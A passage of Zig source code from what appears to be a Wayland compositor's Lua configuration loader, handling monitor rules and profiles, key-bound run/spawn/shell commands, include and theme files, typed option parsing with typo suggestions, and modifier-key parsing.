        ctx.warnAt("monitor() takes a name and a table: monitor(\"DP-1\", {{ primary = true }})", .{});
        return 0;
    }
    warnUnknownKeys(ctx, 2, &monitor_keys, "monitor()");
    var rule: monitors.Rule = .{ .match = ctx.a.dupe(u8, match.?) catch {
        ctx.oom = true;
        return 0;
    } };
    const bad = struct {
        fn at(c: *Ctx, key: []const u8) i32 {
            c.warnAt("monitor(): `{s}` has a wrong value, the rule is ignored", .{key});
            return 0;
        }
    }.at;
    rule.enabled = (optBool(L, 2, "enabled") catch return bad(ctx, "enabled")) orelse true;
    rule.primary = (optBool(L, 2, "primary") catch return bad(ctx, "primary")) orelse false;
    rule.restore_windows = (optBool(L, 2, "restore_windows") catch return bad(ctx, "restore_windows")) orelse true;
    rule.workspaces = optIndex(L, 2, "workspaces", max_workspaces) catch return bad(ctx, "workspaces");
    if (rule.workspaces) |w| rule.workspaces = w + 1; // a count, not an index
    rule.start_workspace = optIndex(L, 2, "start_workspace", max_workspaces) catch return bad(ctx, "start_workspace");
    rule.on_connect = optCommand(ctx, 2, "on_connect") catch |e| {
        if (e == error.OutOfMemory) ctx.oom = true else _ = bad(ctx, "on_connect");
        return 0;
    };
    rule.on_disconnect = optCommand(ctx, 2, "on_disconnect") catch |e| {
        if (e == error.OutOfMemory) ctx.oom = true else _ = bad(ctx, "on_disconnect");
        return 0;
    };
    if (ctx.cfg.monitor_rules.items.len >= monitors.max_rules) {
        ctx.warnAt("monitor(): at most {d} rules", .{monitors.max_rules});
        return 0;
    }
    ctx.cfg.monitor_rules.append(ctx.a, rule) catch {
        ctx.oom = true;
    };
    return 0;
}

/// `monitor_profile{ name = "docked", needs = {"eDP-1", "DP-1"}, run = "kanshictl switch docked" }`:
/// run a command when this set of monitors is connected (and nothing more
/// specific fits).
fn cMonitorProfile(L: *lua.State) i32 {
    const ctx = active orelse return 0;
    if (lua.typeOf(L, 1) != lua.T_TABLE) {
        ctx.warnAt("monitor_profile() takes a table: monitor_profile{{ name = \"docked\", needs = {{\"eDP-1\", \"DP-1\"}}, run = \"...\" }}", .{});
        return 0;
    }
    warnUnknownKeys(ctx, 1, &profile_keys, "monitor_profile()");

    lua.rawGetString(L, 1, "name");
    const name_src = lua.toSlice(L, -1);
    const name = ctx.a.dupe(u8, name_src orelse "(unnamed)") catch {
        ctx.oom = true;
        return 0;
    };
    lua.pop(L, 1);

    lua.rawGetString(L, 1, "needs");
    if (lua.typeOf(L, -1) != lua.T_TABLE) {
        lua.pop(L, 1);
        ctx.warnAt("monitor_profile `{s}`: `needs` must be a list of monitor names", .{name});
        return 0;
    }
    const n = lua.rawLen(L, -1);
    if (n == 0 or n > monitors.max_needs) {
        lua.pop(L, 1);
        ctx.warnAt("monitor_profile `{s}`: `needs` takes 1 to {d} names", .{ name, monitors.max_needs });
        return 0;
    }
    var needs: std.ArrayList([]const u8) = .empty;
    var i: usize = 1;
    while (i <= n) : (i += 1) {
        lua.rawGetI(L, -1, @intCast(i));
        const t = lua.toSlice(L, -1);
        if (t == null or t.?.len == 0) {
            lua.pop(L, 2);
            ctx.warnAt("monitor_profile `{s}`: `needs` holds names (strings)", .{name});
            return 0;
        }
        needs.append(ctx.a, ctx.a.dupe(u8, t.?) catch {
            ctx.oom = true;
            return 0;
        }) catch {
            ctx.oom = true;
            return 0;
        };
        lua.pop(L, 1);
    }
    lua.pop(L, 1);

    const exact = (optBool(L, 1, "exact") catch {
        ctx.warnAt("monitor_profile `{s}`: `exact` must be true or false", .{name});
        return 0;
    }) orelse false;
    const run = optCommand(ctx, 1, "run") catch |e| {
        if (e == error.OutOfMemory) ctx.oom = true else ctx.warnAt("monitor_profile `{s}`: `run` is not a command", .{name});
        return 0;
    };
    if (ctx.cfg.monitor_profiles.items.len >= monitors.max_profiles) {
        ctx.warnAt("monitor_profile(): at most {d} profiles", .{monitors.max_profiles});
        return 0;
    }
    ctx.cfg.monitor_profiles.append(ctx.a, .{
        .name = name,
        .needs = needs.toOwnedSlice(ctx.a) catch {
            ctx.oom = true;
            return 0;
        },
        .exact = exact,
        .run = run,
    }) catch {
        ctx.oom = true;
    };
    return 0;
}

/// Where `run`, `spawn` and `shell` send their text (action.runFromLua; set
/// at start-up, config.zig cannot import action.zig).
pub var runner: ?*const fn ([]const u8) void = null;

/// Calls from Lua are only allowed while a bound function runs.
threadlocal var in_callback: bool = false;

/// A function bound with `bind(combo, function)` runs, in the state of the
/// config that bound it. Errors (and endless loops) are logged, never raised.
pub fn callLua(cfg: *const Config, ref: i32) void {
    const L = cfg.script orelse {
        log.warn("a Lua key binding without its script (config reloaded?)", .{});
        return;
    };
    lua.limitInstructions(L, max_callback_instructions);
    lua.pushRef(L, ref);
    const was = in_callback;
    in_callback = true;
    defer in_callback = was;
    if (!lua.call(L)) {
        const msg = lua.toSlice(L, -1) orelse "(error object is not a string)";
        log.warn("config.lua: {s}", .{msg});
        lua.pop(L, 1);
    }
}

/// A key binding's function should be quick: it runs inside the manage
/// sequence of the compositor.
const max_callback_instructions = 5_000_000;

fn cRun(L: *lua.State) i32 {
    return luaCommand(L, "");
}

fn cSpawn(L: *lua.State) i32 {
    return luaCommand(L, "spawn ");
}

fn cShell(L: *lua.State) i32 {
    return luaCommand(L, "shell ");
}

/// `run("workspace 2")` / `spawn("foot -e htop")` / `shell("a | b")`.
fn luaCommand(L: *lua.State, comptime prefix: []const u8) i32 {
    const text = lua.toSlice(L, 1) orelse {
        if (active) |ctx| ctx.warnAt("takes one string: run(\"workspace 2\")", .{}) else log.warn("config.lua: run/spawn/shell take one string", .{});
        return 0;
    };
    if (!in_callback) {
        if (active) |ctx| ctx.warnAt("run/spawn/shell only work inside a function bound to a key", .{});
        return 0;
    }
    const r = runner orelse return 0;
    var buf: [2048]u8 = undefined;
    const line = std.fmt.bufPrint(&buf, prefix ++ "{s}", .{text}) catch {
        log.warn("config.lua: command too long", .{});
        return 0;
    };
    r(line);
    return 0;
}

fn cUnbind(L: *lua.State) i32 {
    const ctx = active orelse return 0;
    const combo = lua.toSlice(L, 1) orelse {
        ctx.warnAt("unbind() takes one string: unbind(\"Super+q\")", .{});
        return 0;
    };
    removeBind(ctx.binds, combo) catch ctx.warnAt("bad key combination for unbind: `{s}`", .{combo});
    return 0;
}

fn cInclude(L: *lua.State) i32 {
    const ctx = active orelse return 0;
    const value = lua.toSlice(L, 1) orelse {
        ctx.warnAt("include() takes a file name: include(\"local.lua\")", .{});
        return 0;
    };
    includeFile(ctx, value, false);
    return 0;
}

fn cTheme(L: *lua.State) i32 {
    const ctx = active orelse return 0;
    const value = lua.toSlice(L, 1) orelse {
        ctx.warnAt("theme() takes a theme name: theme(\"nord\")", .{});
        return 0;
    };
    includeFile(ctx, value, true);
    return 0;
}

fn includeFile(ctx: *Ctx, value: []const u8, is_theme: bool) void {
    const what: []const u8 = if (is_theme) "theme" else "include";
    const i = ctx.inc orelse {
        ctx.warnAt("`{s}` is not available here", .{what});
        return;
    };
    if (ctx.depth >= max_include_depth) {
        ctx.warnAt("`{s}` nested too deep (limit {d})", .{ what, max_include_depth });
        return;
    }
    if (value.len == 0) {
        ctx.warnAt("`{s}` needs a value", .{what});
        return;
    }

    var found_path: ?[]const u8 = null;
    var text: ?[]const u8 = null;

    if (is_theme) {
        if (!validThemeName(value)) {
            ctx.warnAt("`{s}` is not a theme name", .{value});
            return;
        }
        const first = ctx.print("{s}/Themes/{s}.lua", .{ ctx.dir, value }) orelse return;
        if (i.read(i.ctx, ctx.a, first)) |t| {
            found_path = first;
            text = t;
        } else for (theme_dirs) |d| {
            const p = ctx.print("{s}/{s}.lua", .{ d, value }) orelse return;
            if (i.read(i.ctx, ctx.a, p)) |t| {
                found_path = p;
                text = t;
                break;
            }
        }
    } else {
        const p = if (std.mem.startsWith(u8, value, "~/")) blk: {
            const home = std.c.getenv("HOME") orelse break :blk value;
            break :blk ctx.print("{s}{s}", .{ std.mem.span(home), value[1..] }) orelse return;
        } else if (std.fs.path.isAbsolute(value))
            value
        else
            ctx.print("{s}/{s}", .{ ctx.dir, value }) orelse return;
        if (i.read(i.ctx, ctx.a, p)) |t| {
            found_path = p;
            text = t;
        }
    }

    const path = found_path orelse {
        ctx.warnAt("cannot read {s} `{s}`", .{ what, value });
        return;
    };

    if (is_theme) {
        themeInto(ctx, text.?, path);
        return;
    }
    // The included file runs in the same script (same globals); relative
    // includes inside it start from its own directory.
    const saved_dir = ctx.dir;
    ctx.dir = std.fs.path.dirname(path) orelse ".";
    ctx.depth += 1;
    runChunk(ctx, text.?, path);
    ctx.depth -= 1;
    ctx.dir = saved_dir;
}

// ---- from globals to Config -------------------------------------------------

fn snapshotGlobals(ctx: *Ctx, set: *StringSet) std.mem.Allocator.Error!void {
    const L = ctx.L;
    lua.pushGlobals(L);
    lua.pushNil(L);
    while (lua.next(L, -2)) {
        if (lua.toSlice(L, -2)) |k| try set.put(ctx.a, try ctx.a.dupe(u8, k), {});
        lua.pop(L, 1);
    }
    lua.pop(L, 1);
}

/// Every global the script created is an option. Applied after the script
/// ran, so the last assignment to a name is the one that counts.
fn applyGlobals(ctx: *Ctx, baseline: *const StringSet) std.mem.Allocator.Error!void {
    const L = ctx.L;
    lua.pushGlobals(L);
    lua.pushNil(L);
    while (lua.next(L, -2)) { //  [G, key, value]
        try applyEntry(ctx, baseline);
        lua.pop(L, 1);
    }
    lua.pop(L, 1);
}

fn applyEntry(ctx: *Ctx, baseline: *const StringSet) std.mem.Allocator.Error!void {
    const L = ctx.L;
    const key = lua.toSlice(L, -2) orelse return;
    if (key.len == 0 or key[0] == '_' or baseline.contains(key)) return;
    if (applyOption(ctx, key)) {
        // Only an option that was actually applied counts as "named".
        if (ctx.user_script) markExplicit(ctx.cfg, key);
    } else |err| switch (err) {
        error.OutOfMemory => return error.OutOfMemory,
        error.UnknownKey => {
            // Any other global is the script's own variable. Only a name
            // that looks like a misspelt option is reported.
            if (closestOption(key)) |near| {
                ctx.warn("{s}: unknown option `{s}` (did you mean `{s}`?)", .{ ctx.origin, key, near });
            } else if (isRetiredOption(key)) {
                ctx.warn("{s}: `{s}` is not an option here", .{ ctx.origin, key });
            }
        },
        error.Invalid => ctx.warn("{s}: bad value for `{s}` (got a {s})", .{ ctx.origin, key, lua.typeName(L, -1) }),
    }
}

fn markExplicit(cfg: *Config, key: []const u8) void {
    inline for (@typeInfo(Explicit).@"struct".fields) |f| {
        if (std.mem.eql(u8, key, f.name)) @field(cfg.explicit, f.name) = true;
    }
}

const ParseError = error{ Invalid, UnknownKey, OutOfMemory };

// ---- the option table ---------------------------------------------------------
//
// An option IS a field of `Config`. There is no second list to keep in step:
// the kind of an option follows from the type of its field, and everything
// that walks the options (reading a value from Lua, handing a value back to
// Lua, the typo check, themes) walks `all_options`, which is built from the
// struct at compile time. A new option is one field in `Config` (plus its
// line in default_config.lua); only a bound other than the usual one, a
// colour (also a u32) or an option with a value of its own kind needs a line
// below.

/// Fields of `Config` that are not options.
const not_options = [_][]const u8{
    "arena", "config_file",    "explicit", "monitor_rules", "monitor_profiles",
    "binds", "parse_warnings", "script",
    // Set by the miniaturize animation once it is ported (docs/TODO wlroots.md).
      "iconify_style",
};

/// u32 fields that hold a colour.
const colour_options = [_][]const u8{
    "border_focused", "border_unfocused", "border_floating",
    "tile_from",      "tile_to",          "tile_hot_from",
    "tile_hot_to",    "logo_from",        "logo_to",
    "logo_text",      "tile_text",        "bevel_light",
    "bevel_dark",     "arrow",            "arrow_hot",
};

/// Options whose value is not a plain bool, number, colour, enum, font or
/// command: they have their own reader and writer below.
const special_options = [_][]const u8{
    "width_presets",    "workspace_names", "bind_layout",          "mouse_mod",
    "spawn_at_startup", "environment",     "anim_window_movement", "anim_window_open",
};

const Kind = enum { integer, fraction, colour, boolean, enumeration, font, command, special };

fn inList(comptime list: []const []const u8, comptime name: []const u8) bool {
    inline for (list) |n| {
        if (comptime std.mem.eql(u8, n, name)) return true;
    }
    return false;
}

/// Every option name, in the order of the struct.
const all_options = blk: {
    @setEvalBranchQuota(100_000);
    const fields = @typeInfo(Config).@"struct".fields;
    var count: usize = 0;
    for (fields) |f| {
        if (!inList(&not_options, f.name)) count += 1;
    }
    var names: [count][]const u8 = undefined;
    var i: usize = 0;
    for (fields) |f| {
        if (!inList(&not_options, f.name)) {
            names[i] = f.name;
            i += 1;
        }
    }
    break :blk names;
};

fn kindOf(comptime name: []const u8) Kind {
    @setEvalBranchQuota(10_000);
    if (inList(&colour_options, name)) return .colour;
    if (inList(&special_options, name)) return .special;
    const T = @FieldType(Config, name);
    return switch (@typeInfo(T)) {
        .bool => .boolean,
        .int => .integer,
        .float => .fraction,
        .@"enum" => .enumeration,
        .pointer => if (T == [:0]const u8) .font else if (T == []const []const u8) .command else @compileError("option " ++ name ++ ": no kind for its type"),
        else => @compileError("option " ++ name ++ ": no kind for its type"),
    };
}

/// The values an integer option accepts. Pixel values are 0 ..`max_pixels`:
/// the layout multiplies and sums them, and an absurd one would overflow.
fn intRange(comptime name: []const u8) struct { min: i64, max: i64 } {
    if (comptime std.mem.eql(u8, name, "dock_size")) return .{ .min = min_dock_size, .max = max_dock_size };
    if (comptime std.mem.eql(u8, name, "workspace_count")) return .{ .min = 1, .max = max_workspaces };
    if (comptime std.mem.eql(u8, name, "monitor_settle_ms")) return .{ .min = 0, .max = 10_000 };
    return .{ .min = 0, .max = max_pixels };
}

/// A fraction is above 0 and up to this (a share of the screen, a step).
fn fractionMax(comptime name: []const u8) f64 {
    if (comptime std.mem.eql(u8, name, "anim_slowdown")) return 1000;
    return 1;
}

/// A theme sets how things look and nothing else: every colour, every font,
/// the borders and the gaps.
fn isLook(comptime name: []const u8) bool {
    if (comptime std.mem.eql(u8, name, "gap") or std.mem.eql(u8, name, "outer_gap") or std.mem.eql(u8, name, "border_width")) return true;
    return switch (comptime kindOf(name)) {
        .colour, .font => true,
        else => false,
    };
}

/// Set the option `key` to the Lua value on top of the stack. Nothing is
/// changed unless the value is valid.
fn applyOption(ctx: *Ctx, key: []const u8) ParseError!void {
    inline for (all_options) |name| {
        if (std.mem.eql(u8, key, name)) return applyTyped(ctx, name);
    }
    return error.UnknownKey;
}

fn applyTyped(ctx: *Ctx, comptime name: []const u8) ParseError!void {
    const L = ctx.L;
    const cfg = ctx.cfg;
    switch (comptime kindOf(name)) {
        .integer => {
            const r = comptime intRange(name);
            const v = lua.toInteger(L, -1) orelse return error.Invalid;
            if (v < r.min or v > r.max) return error.Invalid;
            @field(cfg, name) = @intCast(v);
        },
        .fraction => {
            const v = lua.toNumber(L, -1) orelse return error.Invalid;
            if (!(v > 0 and v <= comptime fractionMax(name))) return error.Invalid;
            @field(cfg, name) = v;
        },
        .colour => @field(cfg, name) = colourValue(L) orelse return error.Invalid,
        .boolean => @field(cfg, name) = lua.toBool(L, -1) orelse return error.Invalid,
        .enumeration => {
            const s = lua.toSlice(L, -1) orelse return error.Invalid;
            @field(cfg, name) = std.meta.stringToEnum(@FieldType(Config, name), s) orelse return error.Invalid;
        },
        .font => {
            const s = lua.toSlice(L, -1) orelse return error.Invalid;
            @field(cfg, name) = try parseFont(ctx.a, s);
        },
        .command => @field(cfg, name) = try commandValue(ctx),
        .special => return applySpecial(ctx, name),
    }
}

/// The options with a value of their own kind.
fn applySpecial(ctx: *Ctx, key: []const u8) ParseError!void {
    const L = ctx.L;
    const a = ctx.a;
    const cfg = ctx.cfg;
    const eql = std.mem.eql;

    if (eql(u8, key, "width_presets")) {
        if (lua.typeOf(L, -1) != lua.T_TABLE) return error.Invalid;
        const n = lua.rawLen(L, -1);
        if (n == 0 or n > 64) return error.Invalid;
        var list: std.ArrayList(f64) = .empty;
        var i: usize = 1;
        while (i <= n) : (i += 1) {
            lua.rawGetI(L, -1, @intCast(i));
            const f = lua.toNumber(L, -1);
            lua.pop(L, 1);
            const v = f orelse return error.Invalid;
            if (!(v > 0 and v <= 1)) return error.Invalid;
            try list.append(a, v);
        }
        cfg.width_presets = try list.toOwnedSlice(a);
        return;
    }

    if (eql(u8, key, "workspace_names")) {
        // Empty entries (and holes) are kept: they mean "this workspace has
        // no name", so the names stay aligned with the workspace numbers.
        if (lua.typeOf(L, -1) != lua.T_TABLE) return error.Invalid;
        const n = lua.rawLen(L, -1);
        if (n > 256) return error.Invalid;
        var list: std.ArrayList([]const u8) = .empty;
        var i: usize = 1;
        while (i <= n) : (i += 1) {
            lua.rawGetI(L, -1, @intCast(i));
            const is_nil = lua.typeOf(L, -1) == lua.T_NIL;
            const s = lua.toSlice(L, -1);
            if (!is_nil and s == null) {
                lua.pop(L, 1);
                return error.Invalid;
            }
            const copy = try a.dupe(u8, s orelse "");
            lua.pop(L, 1);
            try list.append(a, copy);
        }
        cfg.workspace_names = try list.toOwnedSlice(a);
        return;
    }

    if (eql(u8, key, "spawn_at_startup")) {
        if (lua.typeOf(L, -1) != lua.T_TABLE) return error.Invalid;
        const n = lua.rawLen(L, -1);
        if (n > max_startup_commands) return error.Invalid;
        var list: std.ArrayList([]const []const u8) = .empty;
        var i: usize = 1;
        while (i <= n) : (i += 1) {
            lua.rawGetI(L, -1, @intCast(i));
            const argv = commandValue(ctx) catch |e| {
                lua.pop(L, 1);
                return e;
            };
            lua.pop(L, 1);
            try list.append(a, argv);
        }
        cfg.spawn_at_startup = try list.toOwnedSlice(a);
        return;
    }

    if (eql(u8, key, "environment")) {
        if (lua.typeOf(L, -1) != lua.T_TABLE) return error.Invalid;
        var list: std.ArrayList(EnvVar) = .empty;
        lua.pushNil(L);
        while (lua.next(L, -2)) { //                      [tbl, key, value]
            const good = lua.typeOf(L, -2) == .string and lua.typeOf(L, -1) == .string and list.items.len < max_env_vars;
            const k = if (good) lua.toSlice(L, -2) else null;
            const v = if (good) lua.toSlice(L, -1) else null;
            if (k == null or v == null or !validEnvName(k.?) or std.mem.indexOfScalar(u8, v.?, 0) != null) {
                lua.pop(L, 2);
                return error.Invalid;
            }
            const entry: EnvVar = .{ .name = a.dupe(u8, k.?) catch {
                lua.pop(L, 2);
                return error.OutOfMemory;
            }, .value = a.dupe(u8, v.?) catch {
                lua.pop(L, 2);
                return error.OutOfMemory;
            } };
            list.append(a, entry) catch {
                lua.pop(L, 2);
                return error.OutOfMemory;
            };
            lua.pop(L, 1); //                             [tbl, key]
        }
        cfg.environment = try list.toOwnedSlice(a);
        return;
    }

    if (eql(u8, key, "anim_window_movement") or eql(u8, key, "anim_window_open")) {
        const s = lua.toSlice(L, -1) orelse return error.Invalid;
        const spec = animation.Spec.parse(s) orelse return error.Invalid;
        if (eql(u8, key, "anim_window_movement")) cfg.anim_window_movement = spec else cfg.anim_window_open = spec;
        return;
    }

    if (eql(u8, key, "bind_layout")) {
        if (lua.toInteger(L, -1)) |n| {
            if (n < 0 or n >= max_bind_layouts) return error.Invalid;
            const layout: u32 = @intCast(n);
            cfg.bind_layout = layout;
            return;
        }
        const s = lua.toSlice(L, -1) orelse return error.Invalid;
        if (!(eql(u8, s, "current") or eql(u8, s, "active"))) return error.Invalid;
        cfg.bind_layout = null;
        return;
    }

    if (eql(u8, key, "mouse_mod")) {
        const s = lua.toSlice(L, -1) orelse return error.Invalid;
        cfg.mouse_mod = parseMods(s) orelse return error.Invalid;
        return;
    }

    return error.UnknownKey;
}

// ---- reading options from the script ----------------------------------------

/// Before the script runs, every option is readable in it with the value it
/// has right now (the built-in default, or what an earlier file set), so a
/// script can build on it: `gap = gap + 2`, `if border_width > 2 then ... end`,
/// `table.insert(width_presets, 0.9)`. The values sit in a table that the
/// globals fall back to, so they are NOT globals of the script: only what the
/// script assigns counts as set (and as written down, see `Explicit`).
fn presetOptions(ctx: *Ctx) std.mem.Allocator.Error!void {
    const L = ctx.L;
    lua.newTable(L); //                              [preset]
    inline for (all_options) |name| {
        lua.pushString(L, name);
        if (try pushOption(ctx, name)) {
            lua.rawSet(L, -3); //                    preset[name] = value
        } else lua.pop(L, 1); //                     the name
    }
    lua.pushValue(L, -1);
    ctx.preset_ref = lua.makeRef(L); //              [preset]
    lua.setGlobalFallback(L); //                     []
}

/// A table option the script changed in place (`table.insert(width_presets,
/// 0.9)`) was never assigned, so it is not a global: take it from the preset
/// table, where it was changed. Applying an unchanged one is a no-op.
fn applyChangedTables(ctx: *Ctx) std.mem.Allocator.Error!void {
    const L = ctx.L;
    lua.pushRef(L, ctx.preset_ref); //               [preset]
    inline for (.{ "width_presets", "workspace_names", "terminal", "launcher", "browser", "spawn_at_startup", "environment" }) |name| {
        lua.pushGlobals(L);
        lua.rawGetString(L, -1, name); //            [preset, G, value]
        const assigned = lua.typeOf(L, -1) != lua.T_NIL;
        lua.pop(L, 2); //                            [preset]
        if (!assigned) {
            lua.rawGetString(L, -1, name); //        [preset, value]
            applyOption(ctx, name) catch |err| switch (err) {
                error.OutOfMemory => return error.OutOfMemory,
                error.UnknownKey => {},
                error.Invalid => ctx.warn("{s}: bad value for `{s}` (got a {s})", .{ ctx.origin, name, lua.typeName(L, -1) }),
            };
            lua.pop(L, 1); //                        [preset]
        }
    }
    lua.pop(L, 1);
}

/// Push the current value of the option `name`, in the form the script
/// would write it. false: nothing was pushed.
fn pushOption(ctx: *Ctx, comptime name: []const u8) std.mem.Allocator.Error!bool {
    const L = ctx.L;
    const cfg = ctx.cfg;
    switch (comptime kindOf(name)) {
        .integer => lua.pushInteger(L, @field(cfg, name)),
        .fraction => lua.pushNumber(L, @field(cfg, name)),
        .colour => {
            var buf: [16]u8 = undefined;
            lua.pushString(L, std.fmt.bufPrint(&buf, "#{x:0>6}", .{@field(cfg, name)}) catch return false);
        },
        .boolean => lua.pushBool(L, @field(cfg, name)),
        .enumeration => lua.pushString(L, @tagName(@field(cfg, name))),
        .font => lua.pushString(L, @field(cfg, name)),
        .command => pushStrings(L, @field(cfg, name)),
        .special => return pushSpecial(ctx, name),
    }
    return true;
}

fn pushSpecial(ctx: *Ctx, comptime name: []const u8) std.mem.Allocator.Error!bool {
    const L = ctx.L;
    const cfg = ctx.cfg;
    if (comptime std.mem.eql(u8, name, "workspace_names")) {
        pushStrings(L, cfg.workspace_names);
    } else if (comptime std.mem.eql(u8, name, "width_presets")) {
        lua.newTable(L);
        for (cfg.width_presets, 1..) |w, i| {
            lua.pushNumber(L, w);
            lua.rawSetI(L, -2, @intCast(i));
        }
    } else if (comptime std.mem.eql(u8, name, "spawn_at_startup")) {
        lua.newTable(L);
        for (cfg.spawn_at_startup, 1..) |argv, i| {
            pushStrings(L, argv);
            lua.rawSetI(L, -2, @intCast(i));
        }
    } else if (comptime std.mem.eql(u8, name, "environment")) {
        lua.newTable(L);
        for (cfg.environment) |e| {
            lua.pushString(L, e.name);
            lua.pushString(L, e.value);
            lua.rawSet(L, -3);
        }
    } else if (comptime std.mem.eql(u8, name, "anim_window_movement") or std.mem.eql(u8, name, "anim_window_open")) {
        var buf: [96]u8 = undefined;
        const spec = if (comptime std.mem.eql(u8, name, "anim_window_movement")) cfg.anim_window_movement else cfg.anim_window_open;
        lua.pushString(L, spec.format(&buf));
    } else if (comptime std.mem.eql(u8, name, "bind_layout")) {
        if (cfg.bind_layout) |n| lua.pushInteger(L, n) else lua.pushString(L, "current");
    } else if (comptime std.mem.eql(u8, name, "mouse_mod")) {
        var buf: [48]u8 = undefined;
        lua.pushString(L, modsText(&buf, cfg.mouse_mod));
    } else return false;
    return true;
}

fn pushStrings(L: *lua.State, items: []const []const u8) void {
    lua.newTable(L);
    for (items, 1..) |item, i| {
        lua.pushString(L, item);
        lua.rawSetI(L, -2, @intCast(i));
    }
}

/// "Super+Shift" for the modifiers, the form `parseMods` reads back.
fn modsText(buf: []u8, mods: Modifiers) []const u8 {
    var w: std.Io.Writer = .fixed(buf);
    const parts = .{ .{ "mod4", "Super" }, .{ "shift", "Shift" }, .{ "ctrl", "Ctrl" }, .{ "mod1", "Alt" }, .{ "mod3", "Mod3" }, .{ "mod5", "Mod5" } };
    var first = true;
    inline for (parts) |p| {
        if (@field(mods, p[0])) {
            if (!first) w.writeByte('+') catch {};
            w.writeAll(p[1]) catch {};
            first = false;
        }
    }
    return w.buffered();
}

// ---- own variables ----------------------------------------------------------

/// Any global that is not an option is the script's own variable, but one
/// that is a small edit away from an option name is most likely a typo
/// (`gapp`, `bordr_width`) and is reported with a suggestion.
fn closestOption(key: []const u8) ?[]const u8 {
    const limit: usize = if (key.len <= 4) 1 else 2;
    var best: ?[]const u8 = null;
    var best_d: usize = limit + 1;
    inline for (all_options) |name| {
        const d = editDistance(key, name);
        if (d < best_d) {
            best_d = d;
            best = name;
        }
    }
    return best;
}

/// Names people expect to be options but that are not (the Dock level lives
/// in the Dock menu and the saved state). Not left as silent own variables.
fn isRetiredOption(key: []const u8) bool {
    inline for (.{"dock_level"}) |n| {
        if (std.mem.eql(u8, key, n)) return true;
    }
    return false;
}

/// Levenshtein distance; 99 when either string is too long to bother.
fn editDistance(a: []const u8, b: []const u8) usize {
    if (a.len > 40 or b.len > 40) return 99;
    var prev: [41]usize = undefined;
    var cur: [41]usize = undefined;
    for (0..b.len + 1) |j| prev[j] = j;
    for (a, 1..) |ca, i| {
        cur[0] = i;
        for (b, 1..) |cb, j| {
            const sub = prev[j - 1] + @intFromBool(ca != cb);
            cur[j] = @min(@min(prev[j] + 1, cur[j - 1] + 1), sub);
        }
        prev = cur;
    }
    return prev[b.len];
}

/// A colour: `"#d8a657"`, `"d8a657"`, `"0xd8a657"` or the number `0xd8a657`.
fn colourValue(L: *lua.State) ?u32 {
    if (lua.toInteger(L, -1)) |n| {
        if (n < 0 or n > 0xffff_ffff) return null;
        const v: u32 = @intCast(n);
        return v;
    }
    const s = lua.toSlice(L, -1) orelse return null;
    var v = std.mem.trimStart(u8, s, "#");
    if (std.mem.startsWith(u8, v, "0x")) v = v[2..];
    return std.fmt.parseInt(u32, v, 16) catch null;
}

/// A command: a string, split like a command line ("foot -e \"htop -d 5\""),
/// or a table that already is the argv ({ "foot", "-e", "htop -d 5" }).
fn commandValue(ctx: *Ctx) ParseError![]const []const u8 {
    const L = ctx.L;
    const a = ctx.a;
    if (lua.toSlice(L, -1)) |s| {
        return parseCommand(a, s) catch |e| return mapCmdErr(e);
    }
    if (lua.typeOf(L, -1) != lua.T_TABLE) return error.Invalid;
    const n = lua.rawLen(L, -1);
    if (n == 0 or n > 256) return error.Invalid;
    var args: std.ArrayList([]const u8) = .empty;
    var i: usize = 1;
    while (i <= n) : (i += 1) {
        lua.rawGetI(L, -1, @intCast(i));
        const s = lua.toSlice(L, -1) orelse {
            lua.pop(L, 1);
            return error.Invalid;
        };
        const copy = try a.dupe(u8, s);
        lua.pop(L, 1);
        try args.append(a, copy);
    }
    if (args.items[0].len == 0) return error.Invalid;
    return args.toOwnedSlice(a);
}

fn mapCmdErr(e: anyerror) ParseError {
    return if (e == error.OutOfMemory) error.OutOfMemory else error.Invalid;
}

/// A Pango font description: not empty, not longer than `max_font_len`, no
/// control characters. (Whether the family exists is Pango's business: an
/// unknown family falls back to the default font.) Lives in `a`.
fn parseFont(a: std.mem.Allocator, value: []const u8) ParseError![:0]const u8 {
    if (!validFont(value)) return error.Invalid;
    return a.dupeZ(u8, value) catch error.OutOfMemory;
}

pub fn validFont(s: []const u8) bool {
    if (s.len == 0 or s.len > max_font_len) return false;
    for (s) |ch| if (ch < 0x20 or ch == 0x7f) return false;
    return true;
}

/// Split a command line into argv. Supports "double quoted" arguments.
/// The returned slice and its strings live in `a`.
pub fn parseCommand(a: std.mem.Allocator, s: []const u8) ![]const []const u8 {
    var args: std.ArrayList([]const u8) = .empty;
    var i: usize = 0;
    while (i < s.len) {
        while (i < s.len and (s[i] == ' ' or s[i] == '\t')) i += 1;
        if (i >= s.len) break;

        if (s[i] == '"') {
            i += 1;
            const start = i;
            while (i < s.len and s[i] != '"') i += 1;
            try args.append(a, try a.dupe(u8, s[start..i]));
            if (i < s.len) i += 1;
        } else {
            const start = i;
            while (i < s.len and s[i] != ' ' and s[i] != '\t') i += 1;
            try args.append(a, try a.dupe(u8, s[start..i]));
        }
    }
    if (args.items.len == 0) return error.Invalid;
    return args.toOwnedSlice(a);
}

// ----------------------------------------------------------------------------
// Key bindings
// ----------------------------------------------------------------------------

pub fn parseMods(s: []const u8) ?Modifiers {
    var mods: Modifiers = .{};
    var it = std.mem.tokenizeScalar(u8, s, '+');
    var any = false;
    while (it.next()) |tok| {
        const t = std.mem.trim(u8, tok, " \t");
        if (t.len == 0) continue;
        any = true;
        if (eqlNoCase(t, "super") or eqlNoCase(t, "mod4") or eqlNoCase(t, "logo")) {
            mods.mod4 = true;
        } else if (eqlNoCase(t, "shift")) {
            mods.shift = true;
        } else if (eqlNoCase(t, "ctrl") or eqlNoCase(t, "control")) {
            mods.ctrl = true;
        } else if (eqlNoCase(t, "alt") or eqlNoCase(t, "mod1")) {
            mods.mod1 = true;
        } else if (eqlNoCase(t, "mod3")) {
            mods.mod3 = true;
        } else if (eqlNoCase(t, "mod5") or eqlNoCase(t, "altgr")) {
            mods.mod5 = true;
        } else return null;
    }
    return if (any) mods else null;
}

fn eqlNoCase(a: []const u8, b: []const u8) bool {
    return std.ascii.eqlIgnoreCase(a, b);
}

pub fn modsBits(m: Modifiers) u32 {
    return @intCast(@as(std.meta.Int(.unsigned, @bitSizeOf(Modifiers)), @bitCast(m)));
}

/// bind("Super+Shift+h", "close")  ->  Bind
fn addBind(
    a: std.mem.Allocator,
    binds: *std.ArrayList(Bind),
    combo_text: []const u8,
    command_text: []const u8,
) error{ Invalid, OutOfMemory }!void {
    const combo = std.mem.trim(u8, combo_text, " \t");
    const command = std.mem.trim(u8, command_text, " \t");
    if (command.len == 0) return error.Invalid;

    const parsed = parseCombo(a, combo) orelse return error.Invalid;

    // A later bind for the same combo replaces the earlier one.
